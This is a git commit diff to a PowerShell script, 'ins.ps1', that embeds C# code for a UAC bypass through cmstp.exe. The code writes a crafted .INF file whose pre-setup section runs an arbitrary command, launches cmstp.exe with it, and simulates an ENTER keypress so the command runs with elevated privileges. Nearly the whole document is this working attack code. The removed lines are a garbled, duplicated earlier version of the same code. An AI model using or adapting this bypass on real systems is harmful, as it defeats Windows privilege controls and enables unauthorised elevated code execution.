713afb21b9e9bb5639d3579c79a6a015b501e69d
enkiark <96149033+enkiark@users.noreply.github.com>
2023-08-05 05:00:40 +0900

    Update ins.ps1

--- ins.ps1
+++ ins.ps1
@@ -86,13 +86,19 @@ using System.ComponentModel;
 using System.Windows;
 using System.Runtime.InteropServices;
 
+using System;
+using System.Text;
+using System.IO;
+using System.Diagnostics;
+using System.ComponentModel;
+using System.Windows;
+using System.Runtime.InteropServices;
+
 public class CMSTPBypass
 {
-
-
-
-public static string InfData = @"[version]
-Signature=$sign
+    // Our .INF file data!
+    public static string InfData = @"[version]
+Signature=$chicago$
 AdvancedINF=2.5
 
 [DefaultInstall]
@@ -100,7 +106,8 @@ CustomDestination=CustInstDestSectionAllUsers
 RunPreSetupCommands=RunPreSetupCommandsSection
 
 [RunPreSetupCommandsSection]
-LINE
+; Commands Here will be run Before Setup Begins to install
+REPLACE_COMMAND_LINE
 taskkill /IM cmstp.exe /F
 
 [CustInstDestSectionAllUsers]
@@ -114,122 +121,66 @@ ServiceName=""CorpVPN""
 ShortSvcName=""CorpVPN""
 
 ";
-    
-    [DllImport("Shell32.dll", CharSet = CharSet.Auto, SetLastError = true)] 
-    static extern IntPtr ShellExecute(IntPtr hwnd, string lpOperation, string lpFile, string lpParameters, string lpDirectory, int nShowCmd); 
 
-    [DllImport("user32.dll")]
-    static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
-
-    [DllImport("user32.dll")]
-    static extern bool PostMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);
-
+    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+    [DllImport("user32.dll", SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd);
 
     public static string BinaryPath = "c:\\windows\\system32\\cmstp.exe";
 
+    /* Generates a random named .inf file with command to be executed with UAC privileges */
     public static string SetInfFile(string CommandToExecute)
     {
+        string RandomFileName = Path.GetRandomFileName().Split(Convert.ToChar("."))[0];
+        string TemporaryDir = "C:\\windows\\temp";
         StringBuilder OutputFile = new StringBuilder();
-        OutputFile.Append("C:\\windows\\temp");
+        OutputFile.Append(TemporaryDir);
         OutputFile.Append("\\");
-        OutputFile.Append(Path.GetRandomFileName().Split(Convert.ToChar("."))[0]);
+        OutputFile.Append(RandomFileName);
         OutputFile.Append(".inf");
         StringBuilder newInfData = new StringBuilder(InfData);
-        newInfData.Replace("LINE", CommandToExecute);
+        newInfData.Replace("REPLACE_COMMAND_LINE", CommandToExecute);
         File.WriteAllText(OutputFile.ToString(), newInfData.ToString());
         return OutputFile.ToString();
     }
 
     public static bool Execute(string CommandToExecute)
     {
-
-        const int WM_SYSKEYDOWN = 0x0100;
-        const int VK_RETURN = 0x0D;
-
-
+        if(!File.Exists(BinaryPath))
+        {
+            Console.WriteLine("Could not find cmstp.exe binary!");
+            return false;
+        }
         StringBuilder InfFile = new StringBuilder();
         InfFile.Append(SetInfFile(CommandToExecute));
 
+        Console.WriteLine("Payload file written to " + InfFile.ToString());
         ProcessStartInfo startInfo = new ProcessStartInfo(BinaryPath);
         startInfo.Arguments = "/au " + InfFile.ToString();
-        cmd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+        startInfo.UseShellExecute = false;
+        Process.Start(startInfo);
 
+        IntPtr windowHandle = new IntPtr();
+        windowHandle = IntPtr.Zero;
+        do {
+            windowHandle = SetWindowActive("cmstp");
+        } while (windowHandle == IntPtr.Zero);
 
-[AllUSer_LDIDSection]
-""HKLM"", ""SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE"", ""ProfileInstallPath"", ""%UnexpectedError%"", """"
-
-
-[Strings]
-ServiceName=""CorpVPN""
-ShortSvcName=""CorpVPN""
-
-
-";
-    
-    [DllImport("Shell32.dll", CharSet = CharSet.Auto, SetLastError = true)] 
-    static extern IntPtr ShellExecute(IntPtr hwnd, string lpOperation, string lpFile, string lpParameters, string lpDirectory, int nShowCmd); 
-
-
-    [DllImport("user32.dll")]
-    static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
-
-
-    [DllImport("user32.dll")]
-    static extern bool PostMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);
-
-
-
-
-    public static string BinaryPath = "c:\\windows\\system32\\cmstp.exe";
-
-
-    public static string SetInfFile(string CommandToExecute)
-    {
-        StringBuilder OutputFile = new StringBuilder();
-        OutputFile.Append("C:\\windows\\temp");
-        OutputFile.Append("\\");
-        OutputFile.Append(Path.GetRandomFileName().Split(Convert.ToChar("."))[0]);
-        OutputFile.Append(".inf");
-        StringBuilder newInfData = new StringBuilder(InfData);
-        newInfData.Replace("LINE", CommandToExecute);
-        File.WriteAllText(OutputFile.ToString(), newInfData.ToString());
-        return OutputFile.ToString();
-    }
-
-
-    public static bool Execute(string CommandToExecute)
-    {
-
-
-        const int WM_SYSKEYDOWN = 0x0100;
-        const int VK_RETURN = 0x0D;
-
-
-
-
-        StringBuilder InfFile = new StringBuilder();
-        InfFile.Append(SetInfFile(CommandToExecute));
-
-
-        ProcessStartInfo startInfo = new ProcessStartInfo(BinaryPath);
-        startInfo.Arguments = "/au " + InfFile.ToString();
-        cmd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
-    cmd.StartInfo.CreateNoWindow = true;
-        IntPtr dptr = Marshal.AllocHGlobal(1); 
-        ShellExecute(dptr, "", BinaryPath, startInfo.Arguments,  "", 0);
-
-
-        Thread.Sleep(5000);
-        IntPtr WindowToFind = FindWindow(null, "CorpVPN"); // Window Titel
-
-
-        PostMessage(WindowToFind, WM_SYSKEYDOWN, VK_RETURN, 0);        
+        System.Windows.Forms.SendKeys.SendWait("{ENTER}");
         return true;
     }
 
-
-
-
+    public static IntPtr SetWindowActive(string ProcessName)
+    {
+        Process[] target = Process.GetProcessesByName(ProcessName);
+        if(target.Length == 0) return IntPtr.Zero;
+        target[0].Refresh();
+        IntPtr WindowHandle = new IntPtr();
+        WindowHandle = target[0].MainWindowHandle;
+        if(WindowHandle == IntPtr.Zero) return IntPtr.Zero;
+        SetForegroundWindow(WindowHandle);
+        ShowWindow(WindowHandle, 5);
+        return WindowHandle;
+    }
 }
 "@
 
